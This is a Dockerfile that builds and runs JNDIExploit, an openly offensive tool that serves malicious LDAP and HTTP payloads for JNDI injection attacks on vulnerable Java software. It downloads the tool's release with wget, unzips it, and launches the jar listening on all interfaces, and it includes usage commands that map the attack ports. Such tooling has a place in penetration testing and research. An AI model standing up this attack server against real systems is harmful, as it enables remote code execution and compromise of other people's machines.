#!/usr/bin/docker
# Title:                JNDIExploit
# Repository:           https://github.com/feihong-cs/JNDIExploit
# Authors:              feihong-cs <https://github.com/feihong-cs>
#                       sickcodes <https://github.com/sickcodes>
# File License:         GPLv3+
# 
# Build:
#           docker build -t jndiexploit .
# Usage:
#           docker run -it jndiexploit 
# Extended:
#           docker run -it -p 1389:1389 -p 80:80 -e LDAP_PORT=1389 -e HTTP_PORT=80 jndiexploit

FROM openjdk:18-jdk-slim-buster

LABEL maintainer='https://github.com/sickcodes <https://sick.codes>'

SHELL ["/bin/bash", "-c"]

USER root

ENV USER=root

WORKDIR /root

ARG JNDIEXPLOIT_URL="https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip"

ENV LDAP_PORT=1389

ENV HTTP_PORT=80

RUN apt update -y \
    && apt install wget unzip -y \
    && wget "${JNDIEXPLOIT_URL}" \
    && unzip "$(basename "${JNDIEXPLOIT_URL}")"

CMD java -jar ./JNDIExploit-1.2-SNAPSHOT.jar \
    --ip 0.0.0.0 \
    --ldapPort "${LDAP_PORT}" \
    --httpPort "${HTTP_PORT}"

# docker run -it jndiexploit
# docker run -it -e LDAP_PORT=1389 -e HTTP_PORT=80 jndiexploit
# docker run -it -p 1389:1389 -p 80:80 -e LDAP_PORT=1389 -e HTTP_PORT=80 jndiexploit